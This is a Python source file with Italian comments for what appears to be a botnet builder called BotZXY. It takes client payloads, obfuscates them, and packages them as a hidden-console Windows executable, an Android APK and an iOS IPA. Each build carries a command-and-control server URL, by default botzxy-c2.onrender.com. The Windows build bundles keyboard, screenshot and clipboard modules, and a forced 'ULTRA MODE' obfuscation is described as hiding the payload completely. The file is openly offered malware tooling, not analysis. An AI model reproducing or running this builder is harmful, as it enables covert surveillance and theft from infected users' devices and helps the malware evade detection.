#!/usr/bin/env python3
# BotZXY Universal Builder con Obfuscator Integrato

import os
import sys
import platform
import subprocess
import shutil
import time
import json
import glob

# ============ COLORI ============
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_header():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Colors.PURPLE}{Colors.BOLD}╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║     ██████╗  ██████╗ ████████╗███████╗██╗  ██╗██╗   ██╗
║     ██╔══██╗██╔═══██╗╚══██╔══╝╚══███╔╝╚██╗██╔╝╚██╗ ██╔╝
║     ██████╔╝██║   ██║   ██║     ███╔╝  ╚███╔╝  ╚████╔╝ 
║     ██╔══██╗██║   ██║   ██║    ███╔╝   ██╔██╗   ╚██╔╝  
║     ██████╔╝╚██████╔╝   ██║   ███████╗██╔╝ ██╗   ██║   
║     ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝   
║                                                           ║
║              {Colors.YELLOW}UNIVERSAL BUILDER + OBFUSCATOR{Colors.END}{Colors.PURPLE}
║                    v2.0 - ULTRA MODE                     ║
╚═══════════════════════════════════════════════════════════╝{Colors.END}
    """)

def print_success(msg):
    print(f"{Colors.GREEN}✔ {msg}{Colors.END}")

def print_error(msg):
    print(f"{Colors.RED}✖ {msg}{Colors.END}")

def print_info(msg):
    print(f"{Colors.BLUE}ℹ {msg}{Colors.END}")

def print_warning(msg):
    print(f"{Colors.YELLOW}⚠ {msg}{Colors.END}")

def print_section(title):
    print(f"\n{Colors.CYAN}{Colors.BOLD}┌─ {title} ─────────────────────────────────────────────┐{Colors.END}")

def obfuscate_file(input_file, output_file):
    """Offusca il payload con tecniche avanzate"""
    print_section("OFFUSCAMENTO PAYLOAD")
    print_info(f"Input: {input_file}")
    print_info(f"Output: {output_file}")
    
    try:
        from obfuscator import BotZXYObfuscator
        obf = BotZXYObfuscator()
        obf.obfuscate_file(input_file, output_file)
        print_success("Offuscamento completato!")
        return True
    except ImportError:
        print_error("File obfuscator.py non trovato nella stessa directory!")
        print_info("Copia obfuscator.py nella root del builder")
        return False
    except Exception as e:
        print_error(f"Errore offuscamento: {e}")
        return False

def build_windows(c2_url, obfuscate=True):
    print_section("BUILD WINDOWS (.exe)")
    
    client_path = 'payloads/windows_client.py'
    if not os.path.exists(client_path):
        print_error(f"File payload non trovato: {client_path}")
        return False
    
    # Crea il payload offuscato se richiesto
    if obfuscate:
        obf_path = 'payloads/windows_client_obf.py'
        if not obfuscate_file(client_path, obf_path):
            print_warning("Offuscamento fallito, uso payload originale")
            obf_path = client_path
    else:
        obf_path = client_path
    
    # Leggi il payload
    with open(obf_path, 'r') as f:
        content = f.read()
    
    # Sostituisci C2_URL
    content = content.replace('C2_URL = "https://botzxy-c2.onrender.com"', f'C2_URL = "{c2_url}"')
    
    temp_path = 'windows_temp.py'
    with open(temp_path, 'w') as f:
        f.write(content)
    
    print_info("Compilazione in corso...")
    cmd = [
        sys.executable, '-m', 'PyInstaller',
        '--onefile', '--noconsole', '--name', 'botzxy_client',
        '--hidden-import', 'keyboard', '--hidden-import', 'pyautogui',
        '--hidden-import', 'win32clipboard', temp_path
    ]
    
    result = subprocess.run(cmd, capture_output=True)
    os.remove(temp_path)
    
    if result.returncode == 0:
        exe_path = 'dist/botzxy_client.exe'
        if os.path.exists(exe_path):
            print_success(f"EXE creato: {exe_path}")
            size = os.path.getsize(exe_path) / (1024 * 1024)
            print_info(f"Dimensione: {size:.2f} MB")
            return True
    else:
        print_error(f"Errore compilazione: {result.stderr.decode()[:200]}")
        return False

def build_android(c2_url, obfuscate=True):
    print_section("BUILD ANDROID (.apk)")
    
    client_path = 'payloads/android_client.py'
    if not os.path.exists(client_path):
        print_error(f"File payload non trovato: {client_path}")
        return False
    
    # Offusca se richiesto
    if obfuscate:
        obf_path = 'payloads/android_client_obf.py'
        if not obfuscate_file(client_path, obf_path):
            print_warning("Offuscamento fallito, uso payload originale")
            obf_path = client_path
    else:
        obf_path = client_path
    
    # Crea struttura APK
    apk_dir = 'apk_build'
    os.makedirs(apk_dir, exist_ok=True)
    
    with open(obf_path, 'r') as f:
        content = f.read()
    content = content.replace('C2_URL = "https://botzxy-c2.onrender.com"', f'C2_URL = "{c2_url}"')
    
    with open(os.path.join(apk_dir, 'main.py'), 'w') as f:
        f.write(content)
    
    # Crea buildozer.spec
    spec_content = f'''
[app]
title = BotZXY
package.name = botzxy
package.domain = org.botzxy
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf
version = 2.0
requirements = python3,kivy,requests,opencv-python,termux-api,android
orientation = portrait
fullscreen = 0

[buildozer]
log_level = 2
warn_on_root = 1
'''
    with open(os.path.join(apk_dir, 'buildozer.spec'), 'w') as f:
        f.write(spec_content)
    
    os.makedirs(os.path.join(apk_dir, 'bin'), exist_ok=True)
    
    print_info("Compilazione APK in corso... (richiede 5-15 minuti)")
    result = subprocess.run(['buildozer', 'android', 'debug', 'deploy'], cwd=apk_dir, capture_output=True)
    
    if result.returncode == 0:
        apk_files = glob.glob(os.path.join(apk_dir, 'bin', '*.apk'))
        if apk_files:
            os.makedirs('dist', exist_ok=True)
            for apk in apk_files:
                dest = os.path.join('dist', os.path.basename(apk))
                shutil.copy2(apk, dest)
                print_success(f"APK creato: {dest}")
                size = os.path.getsize(dest) / (1024 * 1024)
                print_info(f"Dimensione: {size:.2f} MB")
            return True
    else:
        print_error(f"Errore compilazione APK: {result.stderr.decode()[:200]}")
        return False

def build_ios(c2_url, obfuscate=True):
    print_section("BUILD iOS (.ipa)")
    
    if platform.system() != 'Darwin':
        print_error("La compilazione per iOS richiede macOS con Xcode")
        return False
    
    client_path = 'payloads/ios_client.py'
    if not os.path.exists(client_path):
        print_error(f"File payload non trovato: {client_path}")
        return False
    
    if obfuscate:
        obf_path = 'payloads/ios_client_obf.py'
        if not obfuscate_file(client_path, obf_path):
            print_warning("Offuscamento fallito, uso payload originale")
            obf_path = client_path
    else:
        obf_path = client_path
    
    # Crea struttura IPA
    ipa_dir = 'ipa_build'
    os.makedirs(os.path.join(ipa_dir, 'Payload', 'BotZXY.app'), exist_ok=True)
    
    # Info.plist
    plist_content = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleName</key>
    <string>BotZXY</string>
    <key>CFBundleIdentifier</key>
    <string>com.botzxy.c2</string>
    <key>CFBundleVersion</key>
    <string>2.0</string>
    <key>CFBundleShortVersionString</key>
    <string>2.0</string>
    <key>LSRequiresIPhoneOS</key>
    <true/>
    <key>UISupportedInterfaceOrientations</key>
    <array>
        <string>UIInterfaceOrientationPortrait</string>
    </array>
</dict>
</plist>'''
    with open(os.path.join(ipa_dir, 'Payload', 'BotZXY.app', 'Info.plist'), 'w') as f:
        f.write(plist_content)
    
    with open(obf_path, 'r') as f:
        content = f.read()
    content = content.replace('C2_URL = "https://botzxy-c2.onrender.com"', f'C2_URL = "{c2_url}"')
    
    with open(os.path.join(ipa_dir, 'Payload', 'BotZXY.app', 'main.py'), 'w') as f:
        f.write(content)
    
    print_info("Creazione IPA in corso...")
    import zipfile
    ipa_path = os.path.join('dist', 'BotZXY.ipa')
    os.makedirs('dist', exist_ok=True)
    
    with zipfile.ZipFile(ipa_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(os.path.join(ipa_dir, 'Payload')):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, ipa_dir)
                zipf.write(file_path, arcname)
    
    if os.path.exists(ipa_path):
        print_success(f"IPA creato: {ipa_path}")
        size = os.path.getsize(ipa_path) / (1024 * 1024)
        print_info(f"Dimensione: {size:.2f} MB")
        return True
    else:
        print_error("IPA non creato")
        return False

def install_dependencies():
    print_section("INSTALLAZIONE DIPENDENZE")
    subprocess.run([sys.executable, '-m', 'pip', 'install', 
                   'requests', 'pyinstaller', 'pillow', 'opencv-python', 
                   'pyautogui', 'keyboard', 'pywin32', 'numpy', 'cryptography'])
    subprocess.run([sys.executable, '-m', 'pip', 'install', 'buildozer'])
    print_success("Tutte le dipendenze installate!")
    input("Premi INVIO per continuare...")

def main_menu():
    print_header()
    print(f"""
{Colors.WHITE}┌─────────────────────────────────────────────────────────┐
│  {Colors.CYAN}1{Colors.WHITE} - {Colors.GREEN}Windows (.exe) {Colors.YELLOW}[+Obfuscate]{Colors.WHITE}       │
│  {Colors.CYAN}2{Colors.WHITE} - {Colors.YELLOW}Android (.apk) {Colors.YELLOW}[+Obfuscate]{Colors.WHITE}      │
│  {Colors.CYAN}3{Colors.WHITE} - {Colors.BLUE}iOS (.ipa) {Colors.YELLOW}[+Obfuscate]{Colors.WHITE}          │
│  {Colors.CYAN}4{Colors.WHITE} - {Colors.PURPLE}Installa dipendenze{Colors.WHITE}                         │
│  {Colors.CYAN}5{Colors.WHITE} - {Colors.RED}Esci{Colors.WHITE}                                          │
└─────────────────────────────────────────────────────────┘
    """)
    choice = input(f"{Colors.CYAN}Scelta {Colors.WHITE}(1-5): {Colors.END}").strip()
    return choice

def main():
    while True:
        choice = main_menu()
        
        if choice == '5':
            print(f"\n{Colors.GREEN}Arrivederci!{Colors.END}")
            break
        
        if choice == '4':
            install_dependencies()
            continue
        
        if choice not in ['1', '2', '3']:
            print_error("Scelta non valida")
            time.sleep(1)
            continue
        
        # C2 URL
        print(f"\n{Colors.CYAN}Server C2 attuale: https://botzxy-c2.onrender.com{Colors.END}")
        change = input(f"{Colors.YELLOW}Cambiare URL? (s/n): {Colors.END}").strip().lower()
        if change == 's':
            c2_url = input(f"{Colors.WHITE}Inserisci URL del server C2: {Colors.END}").strip()
            if not c2_url:
                c2_url = "https://botzxy-c2.onrender.com"
        else:
            c2_url = "https://botzxy-c2.onrender.com"
        
        # Offuscamento sempre attivo (ULTRA MODE)
        print(f"\n{Colors.YELLOW}[ULTRA MODE] Offuscamento ATTIVO - Payload completamente nascosto{Colors.END}")
        obfuscate = True
        
        # Build
        if choice == '1':
            build_windows(c2_url, obfuscate)
        elif choice == '2':
            build_android(c2_url, obfuscate)
        elif choice == '3':
            build_ios(c2_url, obfuscate)
        
        print(f"\n{Colors.GREEN}Build completata! I file sono nella cartella 'dist/'{Colors.END}")
        input(f"\n{Colors.WHITE}Premi INVIO per continuare...{Colors.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.GREEN}Arrivederci!{Colors.END}")
        sys.exit(0)